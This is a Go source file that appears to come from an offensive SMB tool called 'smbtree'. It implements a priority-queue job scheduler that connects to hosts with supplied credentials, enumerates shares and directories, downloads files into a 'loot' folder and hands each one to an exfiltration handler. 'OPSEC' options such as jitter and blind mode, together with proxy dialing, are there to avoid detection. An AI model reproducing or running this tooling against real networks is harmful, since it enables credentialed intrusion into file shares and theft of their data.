package queue

import (
	"container/heap"
	"fmt"
	"os"
	"path/filepath"
	"smbtree/pkg/exfil"
	"smbtree/pkg/scanner"
	"smbtree/pkg/smb"
	"smbtree/pkg/utils"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	tea "github.com/charmbracelet/bubbletea"
)

// PriorityQueue implements heap.Interface and holds QueueItems
type PriorityQueue []*utils.QueueItem

func (pq PriorityQueue) Len() int { return len(pq) }

func (pq PriorityQueue) Less(i, j int) bool {
	// Priority items come first. If both priority, use ScheduledTime?
	// Or Priority bool overrides everything.
	if pq[i].Priority && !pq[j].Priority {
		return true
	}
	if !pq[i].Priority && pq[j].Priority {
		return false
	}
	// Earlier time first
	return pq[i].ScheduledTime.Before(pq[j].ScheduledTime)
}

func (pq PriorityQueue) Swap(i, j int) {
	pq[i], pq[j] = pq[j], pq[i]
}

func (pq *PriorityQueue) Push(x interface{}) {
	item := x.(*utils.QueueItem)
	*pq = append(*pq, item)
}

func (pq *PriorityQueue) Pop() interface{} {
	old := *pq
	n := len(old)
	item := old[n-1]
	*pq = old[0 : n-1]
	return item
}

type Scheduler struct {
	Queue       chan utils.QueueItem
	Output      chan tea.Msg
	WorkerCount int
	Exfil       *exfil.Handler
	LootDir     string

	// Internal
	pq           PriorityQueue
	Signal       chan struct{} // Wake up signal
	mu           sync.RWMutex
	AuthHold     bool
	SessionCache map[string]*smb.Session
	CacheMu      sync.Mutex

	// OPSEC Configs
	SafeShares bool
	BlindMode  bool
	FileJitter time.Duration

	// Network
	Dialer  proxy.Dialer
	Timeout time.Duration
}

func NewScheduler(workerCount int, exfilCfg exfil.Config, authHold bool, safeShares bool, blindMode bool, jitter time.Duration, dialer proxy.Dialer, timeout time.Duration) *Scheduler {
	return &Scheduler{
		Queue:        make(chan utils.QueueItem, 100),
		Output:       make(chan tea.Msg, 100),
		WorkerCount:  workerCount,
		Exfil:        exfil.NewHandler(exfilCfg),
		LootDir:      "loot", // default
		pq:           make(PriorityQueue, 0),
		Signal:       make(chan struct{}, 1),
		AuthHold:     authHold,
		SessionCache: make(map[string]*smb.Session),
		SafeShares:   safeShares,
		BlindMode:    blindMode,
		FileJitter:   jitter,
		Dialer:       dialer,
		Timeout:      timeout,
	}
}

func (s *Scheduler) SetLootDir(p string) {
	if p != "" {
		s.LootDir = p
	}
}

func (s *Scheduler) Start() {
	// Start the main scheduling loop
	go s.scheduleLoop()
}

func (s *Scheduler) CloseAllSessions() {
	s.CacheMu.Lock()
	defer s.CacheMu.Unlock()
	for ip, sess := range s.SessionCache {
		sess.Close()
		delete(s.SessionCache, ip)
	}
}

// PrioritizeJob finds a job by ID in the queue and bumps it to immediate execution
func (s *Scheduler) PrioritizeJob(jobID string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	for i, item := range s.pq {
		if item.ID == jobID {
			// Update item
			item.Priority = true
			item.ScheduledTime = time.Now().Add(-1 * time.Hour) // Past
			// Fix heap
			heap.Fix(&s.pq, i)

			// Signal loop to wake up immediately
			select {
			case s.Signal <- struct{}{}:
			default:
			}
			return
		}
	}
}

func (s *Scheduler) scheduleLoop() {
	// We need a way to distribute jobs to workers.
	// Channel 'jobs' to workers?
	workerQueue := make(chan utils.QueueItem)

	// Start workers
	for i := 0; i < s.WorkerCount; i++ {
		go s.worker(workerQueue)
	}

	for {
		var nextJob *utils.QueueItem
		var waitTime time.Duration

		if s.pq.Len() > 0 {
			// Peek at top
			s.mu.RLock()
			item := s.pq[0]
			s.mu.RUnlock()

			now := time.Now()

			if item.Priority || now.After(item.ScheduledTime) || now.Equal(item.ScheduledTime) {
				// Ready to run!
				nextJob = item
				// We'll try to send it. If successful, we pop.
			} else {
				// Wait until ScheduledTime
				waitTime = item.ScheduledTime.Sub(now)
			}
		} else {
			// No jobs scheduled, wait indefinitely for new input
			// (Select will block on s.Queue)
			waitTime = 1000 * time.Hour // arbitrary long time
		}

		// Timer channel
		var timerCh <-chan time.Time
		if nextJob == nil && s.pq.Len() > 0 {
			timer := time.NewTimer(waitTime)
			timerCh = timer.C
		} else if nextJob == nil {
			// Empty queue, just block on input
		} else {
			// Ready to run, but we must select between sending to worker OR receiving new job
			// If we can't send immediately, maybe we should receive new jobs
		}

		if nextJob != nil {
			select {
			case newJob := <-s.Queue:
				// Critical Fix: Explicitly allocate on heap to avoid pointer reuse issues
				jobPtr := new(utils.QueueItem)
				*jobPtr = newJob
				s.mu.Lock()
				heap.Push(&s.pq, jobPtr)
				s.mu.Unlock()

				f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if f != nil {
					fmt.Fprintf(f, "Scheduler Recv: ID=%s\n", newJob.ID)
					f.Close()
				}

			case workerQueue <- *nextJob:
				// Successfully sent to worker
				f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
				if f != nil {
					fmt.Fprintf(f, "Scheduler Dispatch: ID=%s -> Worker\n", nextJob.ID)
					f.Close()
				}

				s.mu.Lock()
				heap.Pop(&s.pq)
				s.mu.Unlock()
			case <-s.Signal:
				// Interrupted by prioritization, loop around to re-evaluate nextJob
				continue
			}
		} else {
			select {
			case newJob := <-s.Queue:
				jobPtr := new(utils.QueueItem)
				*jobPtr = newJob
				s.mu.Lock()
				heap.Push(&s.pq, jobPtr)
				s.mu.Unlock()
			case <-timerCh:
				// Time to check queue again
			case <-s.Signal:
				// Interrupted, loop around
			}
		}
	}
}

func (s *Scheduler) worker(jobs <-chan utils.QueueItem) {
	for job := range jobs {
		s.processJobWithRetry(job)
	}
}

func (s *Scheduler) getSession(job utils.QueueItem) (*smb.Session, bool, error) {
	// Returns session, isCached(bool), error
	if s.AuthHold {
		s.CacheMu.Lock()
		if sess, ok := s.SessionCache[job.HostIP]; ok {
			s.CacheMu.Unlock()
			return sess, true, nil
		}
		s.CacheMu.Unlock()
	}

	// Not cached or caching disabled
	sess, err := smb.Connect(job.HostIP, job.Host.Creds, s.Dialer, s.Timeout)
	if err != nil {
		return nil, false, err
	}

	if s.AuthHold {
		s.CacheMu.Lock()
		s.SessionCache[job.HostIP] = sess
		s.CacheMu.Unlock()
		return sess, false, nil // It is now cached, but "isCached" false implies it's new for this call
	}
	return sess, false, nil
}

func (s *Scheduler) processJobWithRetry(job utils.QueueItem) {
	// Attempt up to 3 times for "signing required" errors
	maxRetries := 3
	for attempt := 1; attempt <= maxRetries; attempt++ {
		// Wrapper to handle session retry
		session, usedCache, err := s.getSession(job)
		if err != nil {
			// Connect error
			if attempt < maxRetries && (isSigningError(err) || (s.AuthHold && usedCache)) {
				// Retryable
				// Invalidate if cached
				if s.AuthHold && usedCache {
					s.CacheMu.Lock()
					delete(s.SessionCache, job.HostIP)
					s.CacheMu.Unlock()
				}
				time.Sleep(500 * time.Millisecond)
				continue
			}
			s.sendError(job, err.Error())
			return
		}

		// If we aren't holding auth, we ensure we close it
		// But in a loop, we must close it if we are about to retry or return
		// So defer is tricky.
		// We will manually close if not AuthHold OR if we hit error and retry.

		// Try execution
		err = s.executeJob(session, job)
		if err == nil {
			// Success
			if !s.AuthHold {
				session.Close()
			}
			return
		}

		// Check Error
		isSigning := isSigningError(err)

		// If failure AND we used a cached session, maybe it timed out?
		// OR if it's a signing error
		if attempt < maxRetries && (isSigning || (s.AuthHold && usedCache)) {
			// Retryable
			f, _ := os.OpenFile("scheduler.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
			if f != nil {
				fmt.Fprintf(f, "Job %s failed (Attempt %d/%d): %v. Retrying...\n", job.ID, attempt, maxRetries, err)
				f.Close()
			}

			// Invalidate/Close
			if s.AuthHold {
				s.CacheMu.Lock()
				delete(s.SessionCache, job.HostIP)
				s.CacheMu.Unlock()
			}
			session.Close()

			time.Sleep(500 * time.Millisecond) // Slight backoff
			continue
		}

		// Not retryable or out of retries
		if !s.AuthHold {
			session.Close()
		}
		s.sendError(job, err.Error())
		return
	}
}

func isSigningError(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	// Check for specific substrings
	// "invalid response error" (often precedes signing requirement issues in some libraries)
	// "signing required"
	targets := []string{"signing required", "invalid response error"}
	for _, t := range targets {
		if strings.Contains(s, t) {
			return true
		}
	}
	return false
}

func (s *Scheduler) sendError(job utils.QueueItem, msg string) {
	s.Output <- utils.JobResult{
		QueueID:    job.ID,
		HostIP:     job.HostIP,
		Success:    false,
		Error:      msg,
		ActionType: job.ActionType,
		Target:     job.Target,
	}
}

func (s *Scheduler) executeJob(session *smb.Session, job utils.QueueItem) error {

	switch job.ActionType {
	case "PULL":
		// Target is "Share/Path"
		share, path := utils.SplitSharePath(job.Target)
		localDest := filepath.Join(s.LootDir, job.HostIP, share, path)

		err := session.DownloadFile(share, path, localDest)
		if err != nil {
			return err
		}

		// Exfiltrate
		if err := s.Exfil.Exfiltrate(localDest); err != nil {
			// Exfil fail is technically a "success" for SMB pull, but let's report it
			// or we can treat it as non-retriable error?
			// For now, let's treat it as success-with-error, but we can't retry Exfil by re-pulling easily
			// actually we can.
			// Let's just return error for simplicity, allowing retry if logical
			return fmt.Errorf("exfil failed: %w", err)
		}

		s.Output <- utils.JobResult{
			QueueID:    job.ID,
			HostIP:     job.HostIP,
			Success:    true,
			ActionType: "PULL",
			Target:     job.Target,
		}
		return nil

	case "TREE":
		shares, err := scanner.ScanHost(session, job.Host, job.DepthParam, s.SafeShares, s.BlindMode, s.FileJitter)
		if err != nil {
			return err
		}
		s.Output <- utils.JobResult{
			QueueID:    job.ID,
			HostIP:     job.HostIP,
			Success:    true,
			Shares:     shares,
			ActionType: "TREE",
		}
		return nil

	case "EXPAND_DIR":
		share, path := utils.SplitSharePath(job.Target)

		children, err := scanner.ScanDir(session, share, path, job.DepthParam, s.BlindMode, s.FileJitter)
		if err != nil {
			return err
		}
		// Return shares as "Children" roughly attached to a dummy root?
		s.Output <- utils.JobResult{
			QueueID:    job.ID,
			HostIP:     job.HostIP,
			Success:    true,
			Shares:     children, // Reusing Shares field for children list
			ActionType: "EXPAND_DIR",
			Target:     job.Target,
		}
		return nil
	}
	return nil
}

// GetQueueSnapshot returns a thread-safe copy of the current queue items
func (s *Scheduler) GetQueueSnapshot() []utils.QueueItem {
	s.mu.RLock()
	defer s.mu.RUnlock()

	items := make([]utils.QueueItem, len(s.pq))
	for i, ptr := range s.pq {
		items[i] = *ptr
	}
	return items
}
